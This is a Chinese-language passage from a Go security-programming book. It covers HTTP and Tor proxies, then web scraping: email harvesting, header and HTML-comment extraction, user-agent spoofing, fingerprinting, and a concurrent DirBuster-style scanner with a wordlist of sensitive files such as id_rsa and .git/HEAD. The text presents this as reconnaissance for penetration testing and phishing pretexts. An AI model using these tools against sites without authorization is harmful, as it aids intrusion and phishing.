您可以使用环境变量设置代理，也可以在请求中明确设置代理。Go HTTP 客户端支持 HTTP、HTTPS 和 SOCKS5 代理，比如 Tor。

# 使用系统代理

如果通过环境变量设置了系统的 HTTP(S)代理，Go 的默认 HTTP 客户端将会遵守。Go 使用`HTTP_PROXY`、`HTTPS_PROXY`和`NO_PROXY`环境变量。小写版本也是有效的。您可以在运行进程之前设置环境变量，或者在 Go 中设置环境变量：

```go
os.Setenv("HTTP_PROXY", "proxyIp:proxyPort")  
```

配置环境变量后，使用默认的 Go HTTP 客户端进行的任何 HTTP 请求都将遵守代理设置。在[`golang.org/pkg/net/http/#ProxyFromEnvironment`](https://golang.org/pkg/net/http/#ProxyFromEnvironment)上阅读更多关于默认代理设置的信息。

# 使用特定的 HTTP 代理

要显式设置代理 URL，忽略环境变量，请在由`http.Client`使用的自定义`http.Transport`对象中设置`ProxyURL`变量。以下示例创建了自定义`http.Transport`并指定了`proxyUrlString`。该示例仅具有代理的占位符值，必须替换为有效的代理。然后创建并配置了`http.Client`以使用带有代理的自定义传输：

```go
package main

import (
   "io/ioutil"
   "log"
   "net/http"
   "net/url"
   "time"
)

func main() {
   proxyUrlString := "http://<proxyIp>:<proxyPort>"
   proxyUrl, err := url.Parse(proxyUrlString)
   if err != nil {
      log.Fatal("Error parsing URL. ", err)
   }

   // Set up a custom HTTP transport for client
   customTransport := &http.Transport{ 
      Proxy: http.ProxyURL(proxyUrl), 
   }
   httpClient := &http.Client{ 
      Transport: customTransport, 
      Timeout:   time.Second * 5, 
   }

   // Make request
   response, err := httpClient.Get("http://www.example.com")
   if err != nil {
      log.Fatal("Error making GET request. ", err)
   }
   defer response.Body.Close()

   // Read and print response from server
   body, err := ioutil.ReadAll(response.Body)
   if err != nil {
      log.Fatal("Error reading body of response. ", err)
   }
   log.Println(string(body))
}
```

# 使用 SOCKS5 代理（Tor）

Tor 是一项旨在保护您隐私的匿名服务。除非您充分了解所有影响，否则不要使用 Tor。在[`www.torproject.org`](https://www.torproject.org)上阅读有关 Tor 的更多信息。此示例演示了在进行请求时如何使用 Tor，但这同样适用于其他 SOCKS5 代理。

要使用 SOCKS5 代理，唯一需要修改的是代理的 URL 字符串。不要使用 HTTP 协议，而是使用`socks5://`协议前缀。

默认的 Tor 端口是`9050`，或者在使用 Tor 浏览器捆绑包时是`9150`。以下示例将执行对`check.torproject.org`的 GET 请求，这将让您知道是否正确地通过 Tor 网络进行路由：

```go
package main

import (
   "io/ioutil"
   "log"
   "net/http"
   "net/url"
   "time"
)

// The Tor proxy server must already be running and listening
func main() {
   targetUrl := "https://check.torproject.org"
   torProxy := "socks5://localhost:9050" // 9150 w/ Tor Browser

   // Parse Tor proxy URL string to a URL type
   torProxyUrl, err := url.Parse(torProxy)
   if err != nil {
      log.Fatal("Error parsing Tor proxy URL:", torProxy, ". ", err)
   }

   // Set up a custom HTTP transport for the client   
   torTransport := &http.Transport{Proxy: http.ProxyURL(torProxyUrl)}
   client := &http.Client{
      Transport: torTransport,
      Timeout: time.Second * 5
   }

   // Make request
   response, err := client.Get(targetUrl)
   if err != nil {
      log.Fatal("Error making GET request. ", err)
   }
   defer response.Body.Close()

   // Read response
   body, err := ioutil.ReadAll(response.Body)
   if err != nil {
      log.Fatal("Error reading body of response. ", err)
   }
   log.Println(string(body))
}
```

# 摘要

在本章中，我们介绍了使用 Go 编写 Web 服务器的基础知识。您现在应该可以轻松创建基本的 HTTP 和 HTTPS 服务器。此外，您应该了解中间件的概念，并知道如何使用 Negroni 包来实现预构建和自定义中间件。

我们还介绍了在尝试保护 Web 服务器时的一些最佳实践。您应该了解 CSRF 攻击是什么，以及如何防止它。您应该能够解释本地和远程文件包含以及风险是什么。

标准库中的 Web 服务器具有生产质量，并且具有创建生产就绪 Web 应用程序所需的一切。还有许多其他用于 Web 应用程序的框架，例如 Gorilla、Revel 和 Martini，但是，最终，您将不得不评估每个框架提供的功能，并查看它们是否符合您的项目需求。

我们还介绍了标准库提供的 HTTP 客户端功能。您应该知道如何进行基本的 HTTP 请求和使用客户端证书进行身份验证的请求。您应该了解在进行请求时如何使用 HTTP 代理。

在下一章中，我们将探讨网络爬虫，以从 HTML 格式的网站中提取信息。我们将从基本技术开始，例如字符串匹配和正则表达式，并探讨用于处理 HTML DOM 的`goquery`包。我们还将介绍如何使用 cookie 在登录会话中爬取。还讨论了指纹识别 Web 应用程序以识别框架。我们还将介绍使用广度优先和深度优先方法爬取网络。


# 第十章：网络爬取

从网络中收集信息在许多情况下都是有用的。网站可以提供丰富的信息。这些信息可以用于在进行社会工程攻击或钓鱼攻击时提供帮助。您可以找到潜在目标的姓名和电子邮件，或者收集关键词和标题，这些可以帮助快速了解网站的主题或业务。您还可以通过网络爬取技术潜在地了解企业的位置，找到图像和文档，并分析网站的其他方面。

了解目标可以让您创建一个可信的借口。借口是攻击者用来欺骗毫无戒心的受害者，使其遵从某种方式上损害用户、其账户或其设备的请求的常见技术。例如，有人调查一家公司，发现它是一家在特定城市拥有集中式 IT 支持部门的大公司。他们可以打电话或给公司的人发电子邮件，假装是支持技术人员，并要求他们执行操作或提供他们的密码。公司公共网站上的信息可能包含许多用于设置借口情况的细节。

Web 爬行是爬取的另一个方面，它涉及跟随超链接到其他页面。广度优先爬行是指尽可能找到尽可能多的不同网站，并跟随它们以找到更多的站点。深度优先爬行是指在转移到下一个站点之前，爬取单个站点以找到所有可能的页面。

在本章中，我们将涵盖网络爬取和网络爬行。我们将通过示例向您介绍一些基本任务，例如查找链接、文档和图像，寻找隐藏文件和信息，并使用一个名为`goquery`的强大的第三方包。我们还将讨论减轻对您自己网站的爬取的技术。

在本章中，我们将具体涵盖以下主题：

+   网络爬取基础知识

+   字符串匹配

+   正则表达式

+   从响应中提取 HTTP 头

+   使用 cookies

+   从页面中提取 HTML 注释

+   在 Web 服务器上搜索未列出的文件

+   修改您的用户代理

+   指纹识别 Web 应用程序和服务器

+   使用 goquery 包

+   列出页面中的所有链接

+   列出页面中的所有文档链接

+   列出页面的标题和标题

+   计算页面上使用最频繁的单词

+   列出页面中所有外部 JavaScript 源

+   深度优先爬行

+   广度优先爬行

+   防止网络爬取

# 网络爬取基础知识

Web 爬取，如本书中所使用的，是从 HTML 结构化页面中提取信息的过程，这些页面是为人类查看而不是以编程方式消费的。一些服务提供了高效的用于编程使用的 API，但有些网站只提供他们的信息在 HTML 页面中。这些网络爬取示例演示了从 HTML 中提取信息的各种方法。我们将看一下基本的字符串匹配，然后是正则表达式，然后是一个名为`goquery`的强大包，用于网络爬取。

# 使用 strings 包在 HTTP 响应中查找字符串

要开始，让我们看一下如何进行基本的 HTTP 请求并使用标准库搜索字符串。首先，我们将创建`http.Client`并设置任何自定义变量；例如，客户端是否应该遵循重定向，应该使用哪组 cookies，或者应该使用哪种传输。

`http.Transport`类型实现了执行 HTTP 请求和获取响应的网络请求操作。默认情况下，使用`http.RoundTripper`，这执行单个 HTTP 请求。对于大多数用例，默认传输就足够了。默认情况下，使用环境中的 HTTP 代理，但也可以在传输中指定代理。如果要使用多个代理，这可能很有用。此示例不使用自定义的`http.Transport`类型，但我想强调`http.Transport`是`http.Client`中的嵌入类型。

我们正在创建一个自定义的 `http.Client` 类型，但只是为了覆盖 `Timeout` 字段。默认情况下，没有超时，应用程序可能会永远挂起。

可以在 `http.Client` 中覆盖的另一种嵌入类型是 `http.CookieJar` 类型。`http.CookieJar` 接口需要的两个函数是：`SetCookies()` 和 `Cookies()`。标准库附带了 `net/http/cookiejar` 包，并且其中包含了 `CookieJar` 的默认实现。多个 cookie jar 的一个用例是登录并存储与网站的多个会话。您可以登录多个用户，并将每个会话存储在一个 cookie jar 中，并根据需要使用每个会话。此示例不使用自定义 cookie jar。

HTTP 响应包含作为读取器接口的主体。我们可以使用接受读取器接口的任何函数从读取器中提取数据。这包括函数，如 `io.Copy()`、`io.ReadAtLeast()`、`io.ReadlAll()` 和 `bufio` 缓冲读取器。在此示例中，`ioutil.ReadAll()` 用于快速将 HTTP 响应的全部内容存储到字节切片变量中。

以下是此示例的代码实现：

```go
// Perform an HTTP request to load a page and search for a string
package main

import (
   "fmt"
   "io/ioutil"
   "log"
   "net/http"
   "os"
   "strings"
   "time"
)

func main() {
   // Load command line arguments
   if len(os.Args) != 3 {
      fmt.Println("Search for a keyword in the contents of a URL")
      fmt.Println("Usage: " + os.Args[0] + " <url> <keyword>")
      fmt.Println("Example: " + os.Args[0] + 
         " https://www.devdungeon.com NanoDano")
      os.Exit(1)
   }
   url := os.Args[1]
   needle := os.Args[2] // Like searching for a needle in a haystack

   // Create a custom http client to override default settings. Optional
   // Use http.Get() instead of client.Get() to use default client.
   client := &http.Client{
      Timeout: 30 * time.Second, // Default is forever!
      // CheckRedirect - Policy for following HTTP redirects
      // Jar - Cookie jar holding cookies
      // Transport - Change default method for making request
   }

   response, err := client.Get(url)
   if err != nil {
      log.Fatal("Error fetching URL. ", err)
   }

   // Read response body
   body, err := ioutil.ReadAll(response.Body)
   if err != nil {
      log.Fatal("Error reading HTTP body. ", err)
   }

   // Search for string
   if strings.Contains(string(body), needle) {
      fmt.Println("Match found for " + needle + " in URL " + url)
   } else {
      fmt.Println("No match found for " + needle + " in URL " + url)
   }
} 
```

# 使用正则表达式在页面中查找电子邮件地址

正则表达式，或者 regex，实际上是一种独立的语言形式。本质上，它是一个表达文本搜索模式的特殊字符串。在使用 shell 时，您可能熟悉星号（`*`）。诸如 `ls *.txt` 的命令使用简单的正则表达式。在这种情况下，星号代表*任何东西*；因此只要以 `.txt` 结尾，任何字符串都会匹配。正则表达式除了星号之外还有其他符号，比如句号（`.`），它匹配任何单个字符，而不是星号，星号将匹配任意长度的字符串。甚至可以使用少量可用的符号来构建更强大的表达式。

正则表达式以慢而著称。所使用的实现保证以线性时间运行，而不是基于输入长度的指数时间。这意味着它将比许多其他不提供该保证的正则表达式实现运行得更快，比如 Perl。Go 的作者之一 Russ Cox 在 2007 年发表了两种不同方法的深度比较，可在[`swtch.com/~rsc/regexp/regexp1.html`](https://swtch.com/~rsc/regexp/regexp1.html)上找到。这对于我们搜索 HTML 页面内容的用例非常重要。如果正则表达式基于输入长度运行时间呈指数增长，可能需要很长时间才能执行某些表达式的搜索。

从[`en.wikipedia.org/wiki/Regular_expression`](https://en.wikipedia.org/wiki/Regular_expression)和相关的 Go 文档[`golang.org/pkg/regexp/`](https://golang.org/pkg/regexp/)中了解更多关于正则表达式的一般知识。

此示例使用正则表达式搜索嵌入在 HTML 中的电子邮件地址链接。它将搜索任何 `mailto` 链接并提取电子邮件地址。我们将使用默认的 HTTP 客户端，并调用 `http.Get()`，而不是创建自定义客户端来修改超时。

典型的电子邮件链接看起来像这样：

```go
<a href="mailto:nanodano@devdungeon.com">
<a href="mailto:nanodano@devdungeon.com?subject=Hello">
```

此示例中使用的正则表达式是：

`"mailto:.*?["?]`

让我们分解并检查每个部分：

+   `"mailto:`：整个片段只是一个字符串文字。第一个字符是引号（`"`），在正则表达式中没有特殊含义。它被视为普通字符。这意味着正则表达式将首先搜索引号字符。引号后面是文本 `mailto` 和一个冒号（`:`）。冒号也没有特殊含义。

+   `.*?`：句点（`.`）表示匹配除换行符以外的任何字符。星号表示基于前一个符号（句点）继续匹配零个或多个字符。在星号之后，是一个问号（`?`）。这个问号告诉星号不要贪婪。它将匹配可能的最短字符串。没有它，星号将继续匹配尽可能长的字符串，同时仍满足完整的正则表达式。我们只想要电子邮件地址本身，而不是任何查询参数，比如`?subject`，所以我们告诉它进行非贪婪或短匹配。

+   `["?]`：正则表达式的最后一部分是`["?]`集合。括号告诉正则表达式匹配括号内封装的任何字符。我们只有两个字符：引号和问号。这里的问号没有特殊含义，被视为普通字符。括号内的两个字符是电子邮件地址结束的两个可能字符。默认情况下，正则表达式将选择最后一个字符并返回最长的字符串，因为前面的星号会变得贪婪。然而，因为我们在前一节直接在星号后面添加了另一个问号，它将执行非贪婪搜索，并在第一个匹配括号内的字符的地方停止。

使用这种技术意味着我们只会找到在 HTML 中使用`<a>`标签明确链接的电子邮件。它不会找到在页面中以纯文本形式编写的电子邮件。创建一个正则表达式来搜索基于模式的电子邮件字符串，比如`<word>@<word>.<word>`，可能看起来很简单，但不同正则表达式实现之间的细微差别以及电子邮件可能具有的复杂变化使得很难制定一个能捕捉到所有有效电子邮件组合的正则表达式。如果您快速在网上搜索一个示例，您会看到有多少变化以及它们变得多么复杂。

如果您正在创建某种网络服务，重要的是通过发送电子邮件并要求他们以某种方式回复或验证链接来验证一个人的电子邮件帐户。我不建议您仅仅依赖正则表达式来确定电子邮件是否有效，我还建议您在使用正则表达式执行客户端电子邮件验证时要非常小心。用户可能有一个在技术上有效的奇怪电子邮件地址，您可能会阻止他们注册到您的服务。

以下是根据 1982 年*RFC 822*实际有效的电子邮件地址的一些示例：

+   `*.*@example.com`

+   `$what^the.#!$%@example.com`

+   `!#$%^&*=()@example.com`

+   `"!@#$%{}^&~*()|/="@example.com`

+   `"hello@example.com"@example.com`

2001 年，*RFC 2822*取代了*RFC 822*。在所有先前的示例中，只有最后两个包含 at（`@`）符号的示例被新的*RFC 2822*认为是无效的。所有其他示例仍然有效。在[`www.ietf.org/rfc/rfc822.txt`](https://www.ietf.org/rfc/rfc822.txt)和[`www.ietf.org/rfc/rfc2822.txt`](https://www.ietf.org/rfc/rfc2822.txt)上阅读原始 RFC。

这是该示例的代码实现：

```go
// Search through a URL and find mailto links with email addresses
package main

import (
   "fmt"
   "io/ioutil"
   "log"
   "net/http"
   "os"
   "regexp"
)

func main() {
   // Load command line arguments
   if len(os.Args) != 2 {
      fmt.Println("Search for emails in a URL")
      fmt.Println("Usage: " + os.Args[0] + " <url>")
      fmt.Println("Example: " + os.Args[0] + 
         " https://www.devdungeon.com")
      os.Exit(1)
   }
   url := os.Args[1]

   // Fetch the URL
   response, err := http.Get(url)
   if err != nil {
      log.Fatal("Error fetching URL. ", err)
   }

   // Read the response
   body, err := ioutil.ReadAll(response.Body)
   if err != nil {
      log.Fatal("Error reading HTTP body. ", err)
   }

   // Look for mailto: links using a regular expression
   re := regexp.MustCompile("\"mailto:.*?[?\"]")
   matches := re.FindAllString(string(body), -1)
   if matches == nil {
      // Clean exit if no matches found
      fmt.Println("No emails found.")
      os.Exit(0)
   }

   // Print all emails found
   for _, match := range matches {
      // Remove "mailto prefix and the trailing quote or question mark
      // by performing a slice operation to extract the substring
      cleanedMatch := match[8 : len(match)-1]
      fmt.Println(cleanedMatch)
   }
} 
```

# 从 HTTP 响应中提取 HTTP 标头

HTTP 标头包含有关请求和响应的元数据和描述信息。通过检查服务器提供的 HTTP 标头，您可以潜在地了解有关服务器的很多信息。您可以了解服务器的以下信息：

+   缓存系统

+   身份验证

+   操作系统

+   Web 服务器

+   响应类型

+   框架或内容管理系统

+   编程语言

+   口头语言

+   安全标头

+   Cookies

并非每个网络服务器都会返回所有这些标头，但从标头中尽可能多地学习是有帮助的。流行的框架，如 WordPress 和 Drupal，将返回一个`X-Powered-By`标头，告诉您它是 WordPress 还是 Drupal 以及版本。

会话 cookie 也可以透露很多信息。名为`PHPSESSID`的 cookie 告诉您它很可能是一个 PHP 应用程序。Django 的默认会话 cookie 的名称是`sessionid`，Java 的是`JSESSIONID`，Ruby on Rail 的会话 cookie 遵循`_APPNAME_session`的模式。您可以使用这些线索来识别 Web 服务器。如果您只想要头部而不需要页面的整个主体，您可以始终使用 HTTP `HEAD`方法而不是 HTTP `GET`。`HEAD`方法将只返回头部。

这个例子对 URL 进行了一个`HEAD`请求，并打印出了它的所有头部。`http.Response`类型包含一个名为`Header`的字符串到字符串的映射，其中包含每个 HTTP 头的键值对：

```go
// Perform an HTTP HEAD request on a URL and print out headers
package main

import (
   "fmt"
   "log"
   "net/http"
   "os"
)

func main() {
   // Load URL from command line arguments
   if len(os.Args) != 2 {
      fmt.Println(os.Args[0] + " - Perform an HTTP HEAD request to a URL")
      fmt.Println("Usage: " + os.Args[0] + " <url>")
      fmt.Println("Example: " + os.Args[0] + 
         " https://www.devdungeon.com")
      os.Exit(1)
   }
   url := os.Args[1]

   // Perform HTTP HEAD
   response, err := http.Head(url)
   if err != nil {
      log.Fatal("Error fetching URL. ", err)
   }

   // Print out each header key and value pair
   for key, value := range response.Header {
      fmt.Printf("%s: %s\n", key, value[0])
   }
} 
```

# 使用 HTTP 客户端设置 cookie

Cookie 是现代 Web 应用程序的一个重要组成部分。Cookie 作为 HTTP 头在客户端和服务器之间来回发送。Cookie 只是由浏览器客户端存储的文本键值对。它们用于在客户端上存储持久数据。它们可以用于存储任何文本值，但通常用于存储首选项、令牌和会话信息。

会话 cookie 通常存储与服务器相匹配的令牌。当用户登录时，服务器会创建一个带有与该用户相关联的标识令牌的会话。然后，服务器以 cookie 的形式将令牌发送回给用户。当客户端以 cookie 的形式发送会话令牌时，服务器会查找并在会话存储中找到匹配的令牌，这可能是数据库、文件或内存中。会话令牌需要足够的熵来确保它是唯一的，攻击者无法猜测。

如果用户在公共 Wi-Fi 网络上，并访问一个不使用 SSL 的网站，附近的任何人都可以看到明文的 HTTP 请求。攻击者可以窃取会话 cookie 并在自己的请求中使用它。当以这种方式 sidejacked cookie 时，攻击者可以冒充受害者。服务器将把他们视为已登录的用户。攻击者可能永远不会知道密码，也不需要知道。

因此，定期注销网站并销毁任何活动会话可能是有用的。一些网站允许您手动销毁所有活动会话。如果您运行一个 Web 服务，我建议您为会话设置合理的过期时间。银行网站通常做得很好，通常强制执行短暂的 10-15 分钟过期时间。

服务器在创建新 cookie 时向客户端发送一个`Set-Cookie`头。然后客户端使用`Cookie`头将 cookie 发送回服务器。

这是服务器发送的 cookie 头的一个简单示例：

```go
Set-Cookie: preferred_background=blue
Set-Cookie: session_id=PZRNVYAMDFECHBGDSSRLH
```

以下是来自客户端的一个示例头部：

```go
Cookie: preferred_background=blue; session_id=PZRNVYAMDFECHBGDSSRLH
```

Cookie 还可以包含其他属性，例如在第九章中讨论的`Secure`和`HttpOnly`标志，*Web 应用程序*。其他属性包括到期日期、域和路径。这个例子只是展示了最简单的应用程序。

在这个例子中，使用自定义会话 cookie 进行了一个简单的请求。会话 cookie 是在向网站发出请求时允许您*登录*的东西。这个例子应该作为如何使用 cookie 发出请求的参考，而不是一个独立的工具。首先，在`main`函数之前定义 URL。然后，首先创建 HTTP 请求，指定 HTTP `GET`方法。由于`GET`请求通常不需要主体，因此提供了一个空主体。然后，使用一个新的头部，cookie，更新新的请求。在这个例子中，`session_id`是会话 cookie 的名称，但这将取决于正在交互的 Web 应用程序。

一旦请求准备好，就会创建一个 HTTP 客户端来实际发出请求并处理响应。请注意，HTTP 请求和 HTTP 客户端是独立的实体。例如，您可以多次重用一个请求，使用不同的客户端使用一个请求，并使用单个客户端进行多个请求。这允许您创建多个具有不同会话 cookie 的请求对象，如果需要管理多个客户端会话。

以下是此示例的代码实现：

```go
package main

import (
   "fmt"
   "io/ioutil"
   "log"
   "net/http"
)

var url = "https://www.example.com"

func main() {
   // Create the HTTP request
   request, err := http.NewRequest("GET", url, nil)
   if err != nil {
      log.Fatal("Error creating HTTP request. ", err)
   }

   // Set cookie
   request.Header.Set("Cookie", "session_id=<SESSION_TOKEN>")

   // Create the HTTP client, make request and print response
   httpClient := &http.Client{}
   response, err := httpClient.Do(request)
   data, err := ioutil.ReadAll(response.Body)
   fmt.Printf("%s\n", data)
} 
```

# 在网页中查找 HTML 注释

HTML 注释有时可能包含惊人的信息。我个人见过在 HTML 注释中包含管理员用户名和密码的网站。我还见过整个菜单被注释掉，但链接仍然有效，可以直接访问。您永远不知道一个粗心的开发人员可能留下什么样的信息。

如果您要在代码中留下评论，最好将它们留在服务器端代码中，而不是在面向客户端的 HTML 和 JavaScript 中。在 PHP、Ruby、Python 或其他后端代码中进行注释。您永远不希望在代码中向客户端提供比他们需要的更多信息。

此程序中使用的正则表达式由几个特殊序列组成。以下是完整的正则表达式。它基本上是说，“匹配`<!--`和`-->`之间的任何内容。”让我们逐个检查它：

+   `<!--(.|\n)*?-->`：开头和结尾分别是`<!--`和`-->`，这是 HTML 注释的开始和结束标记。这些是普通字符，而不是正则表达式的特殊字符。

+   `(.|\n)*?`：这可以分解为两部分：

+   +   `(.|\n)`：第一部分有一些特殊字符。括号`()`括起一组选项。管道`|`分隔选项。选项本身是点`.`和换行字符`\n`。点表示匹配任何字符，除了换行符。因为 HTML 注释可以跨多行，我们希望匹配任何字符，包括换行符。整个部分`(.|\n)`表示匹配点或换行符。

+   +   `*?`：星号表示继续匹配前一个字符或表达式零次或多次。紧接在星号之前的是括号集，因此它将继续尝试匹配`(.|\n)`。问号告诉星号是非贪婪的，或者返回可能的最小匹配。没有问号，以指定它为非贪婪；它将匹配可能的最大内容，这意味着它将从页面中第一个注释的开头开始，并在页面中最后一个注释的结尾结束，包括中间的所有内容。

尝试运行此程序针对一些网站，并查看您能找到什么样的 HTML 注释。您可能会对您能发现的信息感到惊讶。例如，MailChimp 注册表单附带了一个 HTML 注释，实际上为您提供了绕过机器人注册预防的提示。MailChimp 注册表单使用了一个蜜罐字段，不应该填写，否则它会假定该表单是由机器人提交的。看看您能找到什么。

此示例首先获取提供的 URL，然后使用我们之前讨论过的正则表达式搜索 HTML 注释。然后将找到的每个匹配打印到标准输出：

```go
// Search through a URL and find HTML comments
package main

import (
   "fmt"
   "io/ioutil"
   "log"
   "net/http"
   "os"
   "regexp"
)

func main() {
   // Load command line arguments
   if len(os.Args) != 2 {
      fmt.Println("Search for HTML comments in a URL")
      fmt.Println("Usage: " + os.Args[0] + " <url>")
      fmt.Println("Example: " + os.Args[0] + 
         " https://www.devdungeon.com")
      os.Exit(1)
   }
   url := os.Args[1]

   // Fetch the URL and get response
   response, err := http.Get(url)
   if err != nil {
      log.Fatal("Error fetching URL. ", err)
   }
   body, err := ioutil.ReadAll(response.Body)
   if err != nil {
      log.Fatal("Error reading HTTP body. ", err)
   }

   // Look for HTML comments using a regular expression
   re := regexp.MustCompile("<!--(.|\n)*?-->")
   matches := re.FindAllString(string(body), -1)
   if matches == nil {
      // Clean exit if no matches found
      fmt.Println("No HTML comments found.")
      os.Exit(0)
   }

   // Print all HTML comments found
   for _, match := range matches {
      fmt.Println(match)
   }
} 
```

# 在网络服务器上查找未列出的文件

有一个名为 DirBuster 的流行程序，渗透测试人员用于查找未列出的文件。DirBuster 是一个 OWASP 项目，预装在流行的渗透测试 Linux 发行版 Kali 上。只需使用标准库，我们就可以创建一个快速、并发和简单的 DirBuster 克隆，只需几行代码。有关 DirBuster 的更多信息，请访问[`www.owasp.org/index.php/Category:OWASP_DirBuster_Project`](https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)。

这个程序是 DirBuster 的一个简单克隆，它基于一个单词列表搜索未列出的文件。你将不得不创建自己的单词列表。这里提供了一小部分示例文件名，以便给你一些想法，并用作起始列表。根据你自己的经验和源代码构建你的文件列表。一些 Web 应用程序有特定名称的文件，这将允许你指纹识别使用的框架。还要寻找备份文件、配置文件、版本控制文件、更改日志文件、私钥、应用程序日志以及任何不打算公开的东西。你也可以在互联网上找到预先构建的单词列表，包括 DirBuster 的列表。

以下是一个你可以搜索的文件的示例列表：

+   `.gitignore`

+   `.git/HEAD`

+   `id_rsa`

+   `debug.log`

+   `database.sql`

+   `index-old.html`

+   `backup.zip`

+   `config.ini`

+   `settings.ini`

+   `settings.php.bak`

+   `CHANGELOG.txt`

这个程序将使用提供的单词列表搜索一个域，并报告任何没有返回 404 NOT FOUND 响应的文件。单词列表应该用换行符分隔文件名，并且每行一个文件名。在提供域名作为参数时，尾随斜杠是可选的，程序将在有或没有域名尾随斜杠的情况下正常运行。但是协议必须被指定，这样请求才知道是使用 HTTP 还是 HTTPS。

`url.Parse()`函数用于创建一个正确的 URL 对象。使用 URL 类型，你可以独立修改`Path`而不修改`Host`或`Scheme`。这提供了一种简单的方法来更新 URL，而不必求助于手动字符串操作。

为了逐行读取文件，使用了一个 scanner。默认情况下，scanner 按照换行符分割，但可以通过调用`scanner.Split()`并提供自定义分割函数来覆盖。我们使用默认行为，因为单词应该是在单独的行上提供的。

```go
// Look for unlisted files on a domain
package main

import (
   "bufio"
   "fmt"
   "log"
   "net/http"
   "net/url"
   "os"
   "strconv"
)

// Given a base URL (protocol+hostname) and a filepath (relative URL)
// perform an HTTP HEAD and see if the path exists.
// If the path returns a 200 OK print out the path
func checkIfUrlExists(baseUrl, filePath string, doneChannel chan bool) {
   // Create URL object from raw string
   targetUrl, err := url.Parse(baseUrl)
   if err != nil {
      log.Println("Error parsing base URL. ", err)
   }
   // Set the part of the URL after the host name
   targetUrl.Path = filePath

   // Perform a HEAD only, checking status without
   // downloading the entire file
   response, err := http.Head(targetUrl.String())
   if err != nil {
      log.Println("Error fetching ", targetUrl.String())
   }

   // If server returns 200 OK file can be downloaded
   if response.StatusCode == 200 {
      log.Println(targetUrl.String())
   }

   // Signal completion so next thread can start
   doneChannel <- true
}

func main() {
   // Load command line arguments
   if len(os.Args) != 4 {
      fmt.Println(os.Args[0] + " - Perform an HTTP HEAD request to a URL")
      fmt.Println("Usage: " + os.Args[0] + 
         " <wordlist_file> <url> <maxThreads>")
      fmt.Println("Example: " + os.Args[0] + 
         " wordlist.txt https://www.devdungeon.com 10")
      os.Exit(1)
   }
   wordlistFilename := os.Args[1]
   baseUrl := os.Args[2]
   maxThreads, err := strconv.Atoi(os.Args[3])
   if err != nil {
      log.Fatal("Error converting maxThread value to integer. ", err)
   }

   // Track how many threads are active to avoid
   // flooding a web server
   activeThreads := 0
   doneChannel := make(chan bool)

   // Open word list file for reading
   wordlistFile, err := os.Open(wordlistFilename)
   if err != nil {
      log.Fatal("Error opening wordlist file. ", err)
   }

   // Read each line and do an HTTP HEAD
   scanner := bufio.NewScanner(wordlistFile)
   for scanner.Scan() {
      go checkIfUrlExists(baseUrl, scanner.Text(), doneChannel)
      activeThreads++

      // Wait until a done signal before next if max threads reached
      if activeThreads >= maxThreads {
         <-doneChannel
         activeThreads -= 1
      }
   }

   // Wait for all threads before repeating and fetching a new batch
   for activeThreads > 0 {
      <-doneChannel
      activeThreads -= 1
   }

   // Scanner errors must be checked manually
   if err := scanner.Err(); err != nil {
      log.Fatal("Error reading wordlist file. ", err)
   }
} 
```

# 更改请求的用户代理

一个常见的阻止爬虫和网络爬虫的技术是阻止特定的用户代理。一些服务会把包含关键词如`curl`和`python`的特定用户代理列入黑名单。你可以通过简单地将你的用户代理更改为`firefox`来绕过大部分这些限制。

要设置用户代理，你必须首先创建 HTTP 请求对象。在实际请求之前必须设置头部。这意味着你不能使用`http.Get()`等快捷便利函数。我们必须创建客户端，然后创建一个请求，然后使用客户端来`client.Do()`请求。

这个例子使用`http.NewRequest()`创建了一个 HTTP 请求，然后修改请求头来覆盖`User-Agent`头部。你可以用这个来隐藏、伪装或者诚实。为了成为一个良好的网络公民，我建议你为你的爬虫创建一个独特的用户代理，这样网站管理员可以限制或者阻止你的机器人。我还建议你在用户代理中包含一个网站或者电子邮件地址，这样网站管理员可以请求跳过你的爬虫。

以下是这个例子的代码实现：

```go
// Change HTTP user agent
package main

import (
   "log"
   "net/http"
)

func main() {
   // Create the request for use later
   client := &http.Client{}
   request, err := http.NewRequest("GET", 
      "https://www.devdungeon.com", nil)
   if err != nil {
      log.Fatal("Error creating request. ", err)
   }

   // Override the user agent
   request.Header.Set("User-Agent", "_Custom User Agent_")

   // Perform the request, ignore response.
   _, err = client.Do(request)
   if err != nil {
      log.Fatal("Error making request. ", err)
   }
} 
```

# 指纹识别 Web 应用程序技术栈

指纹识别 Web 应用程序是指尝试识别用于提供 Web 应用程序的技术。指纹识别可以在几个级别进行。在较低级别，HTTP 头可以提供关于正在运行的操作系统（如 Windows 或 Linux）和 Web 服务器（如 Apache 或 nginx）的线索。头部还可以提供有关应用程序级别使用的编程语言或框架的信息。在较高级别，Web 应用程序可以被指纹识别以确定正在使用哪些 JavaScript 库，是否包括任何分析平台，是否显示任何广告网络，正在使用的缓存层等信息。我们将首先查看 HTTP 头部，然后涵盖更复杂的指纹识别方法。

指纹识别是攻击或渗透测试中的关键步骤，因为它有助于缩小选项并确定要采取的路径。识别正在使用的技术还让您可以搜索已知的漏洞。如果一个 Web 应用程序没有及时更新，简单的指纹识别和漏洞搜索可能就足以找到并利用已知的漏洞。如果没有其他办法，它也可以帮助您了解目标。

# 基于 HTTP 响应头的指纹识别

我建议您首先检查 HTTP 头，因为它们是简单的键值对，通常每个请求只返回几个。手动浏览头部不会花费太长时间，所以您可以在继续应用程序之前首先检查它们。应用程序级别的指纹识别更加复杂，我们稍后会谈论这个。在本章的前面，有一个关于提取 HTTP 头并打印它们以供检查的部分（*从 HTTP 响应中提取 HTTP 头*部分）。您可以使用该程序来转储不同网页的头部并查看您能找到什么。

基本思想很简单。寻找关键字。特别是一些头部包含最明显的线索，例如`X-Powered-By`、`Server`和`X-Generator`头部。`X-Powered-By`头部可以包含正在使用的框架或**内容管理系统**（**CMS**）的名称，例如 WordPress 或 Drupal。

检查头部有两个基本步骤。首先，您需要获取头部。使用本章前面提供的示例来提取 HTTP 头。第二步是进行字符串搜索以查找关键字。您可以使用`strings.ToUpper()`和`strings.Contains()`直接搜索关键字，或者使用正则表达式。请参考本章前面的示例，了解如何使用正则表达式。一旦您能够搜索头部，您只需要能够生成要搜索的关键字列表。

有许多关键字可以搜索。您搜索的内容将取决于您要寻找的内容。我将尝试涵盖几个广泛的类别，以便给您一些寻找内容的想法。您可以尝试识别的第一件事是主机正在运行的操作系统。以下是一个示例关键字列表，您可以在 HTTP 头部中找到，以指示操作系统：

+   `Linux`

+   `Debian`

+   `Fedora`

+   `Red Hat`

+   `CentOS`

+   `Ubuntu`

+   `FreeBSD`

+   `Win32`

+   `Win64`

+   `Darwin`

